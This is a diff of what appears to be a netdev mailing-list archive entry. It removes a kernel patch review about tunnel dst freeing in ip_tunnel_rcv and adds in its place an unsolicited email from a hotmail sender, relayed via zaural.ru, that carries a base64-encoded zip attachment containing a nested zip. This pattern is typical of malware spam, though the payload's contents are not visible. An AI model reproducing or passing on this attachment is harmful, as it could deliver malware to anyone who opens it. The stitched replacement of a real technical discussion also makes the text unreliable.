@@ -1,76 +1,74 @@
-From: =?utf-8?B?5Lil5rW35Y+M?= <yanhaishuang@cmss.chinamobile.com>
-Subject: Re: [PATCH v2 1/2] ip_tunnel: fix potential issue in ip_tunnel_rcv
-Date: Thu, 8 Jun 2017 11:07:51 +0800
-Message-ID: <F11E2C01-13F4-4BDD-8380-92F57DA884F6@cmss.chinamobile.com>
-References: <1496883476-17445-1-git-send-email-yanhaishuang@cmss.chinamobile.com>
- <CAOrHB_CZ-3TRs2O3KATW_ji_QQxqO=28UeDU_-Gx7ZPxz_RWCg@mail.gmail.com>
-Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 8BIT
-Cc: "=David S. Miller" <davem@davemloft.net>,
-        Alexey Kuznetsov <kuznet@ms2.inr.ac.ru>,
-        James Morris <jmorris@namei.org>,
-        Hideaki YOSHIFUJI <yoshfuji@linux-ipv6.org>,
-        Patrick McHardy <kaber@trash.net>,
-        Linux Kernel Network Developers <netdev@vger.kernel.org>,
-        LKML <linux-kernel@vger.kernel.org>,
-        Pravin B Shelar <pshelar@nicira.com>
-To: Pravin Shelar <pshelar@ovn.org>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <CAOrHB_CZ-3TRs2O3KATW_ji_QQxqO=28UeDU_-Gx7ZPxz_RWCg@mail.gmail.com>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+From: <agar2000@hotmail.com>
+Subject: (unknown)
+Date: Thu, 08 Jun 2017 03:14:56 -0000
+Message-ID: <149689169640.8931.4485050324892991369@zaural.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="225162210782.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from ws40.zone31-163-169.zaural.ru ([31.163.169.40]:59185 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751433AbdFHDO7 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Wed, 7 Jun 2017 23:14:59 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-
-
-> On 8 Jun 2017, at 10:13 AM, Pravin Shelar <pshelar@ovn.org> wrote:
-> 
-> On Wed, Jun 7, 2017 at 5:57 PM, Haishuang Yan
-> <yanhaishuang@cmss.chinamobile.com> wrote:
->> When ip_tunnel_rcv fails, the tun_dst won't be freed, so move
->> skb_dst_set to begin and tun_dst would be freed by kfree_skb.
->> 
->> CC: Pravin B Shelar <pshelar@nicira.com>
->> Fixes: 2e15ea390e6f ("ip_gre: Add support to collect tunnel metadata.")
->> Signed-off-by: Haishuang Yan <yanhaishuang@cmss.chinamobile.com390e>
->> ---
->> net/ipv4/ip_tunnel.c | 6 +++---
->> 1 file changed, 3 insertions(+), 3 deletions(-)
->> 
->> diff --git a/net/ipv4/ip_tunnel.c b/net/ipv4/ip_tunnel.c
->> index b878ecb..27fc20f 100644
->> --- a/net/ipv4/ip_tunnel.c
->> +++ b/net/ipv4/ip_tunnel.c
->> @@ -386,6 +386,9 @@ int ip_tunnel_rcv(struct ip_tunnel *tunnel, struct sk_buff *skb,
->>        const struct iphdr *iph = ip_hdr(skb);
->>        int err;
->> 
->> +       if (tun_dst)
->> +               skb_dst_set(skb, (struct dst_entry *)tun_dst);
->> +
-> If dst is set so early, skb_scrub_packet() would remove the tunnel dst
-> reference.
-> It is better to call skb_dst_drop() from error code path.
-
-Yes, I will change it in v3 commit, thanks!
-
-> 
->> #ifdef CONFIG_NET_IPGRE_BROADCAST
->>        if (ipv4_is_multicast(iph->daddr)) {
->>                tunnel->dev->stats.multicast++;
->> @@ -439,9 +442,6 @@ int ip_tunnel_rcv(struct ip_tunnel *tunnel, struct sk_buff *skb,
->>                skb->dev = tunnel->dev;
->>        }
->> 
->> -       if (tun_dst)
->> -               skb_dst_set(skb, (struct dst_entry *)tun_dst);
->> -
->>        gro_cells_receive(&tunnel->gro_cells, skb);
->>        return 0;
->> 
->> --
->> 1.8.3.1
->> 
->> 
->> 
-> 
+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
+TgAAAOULAAAAAA==
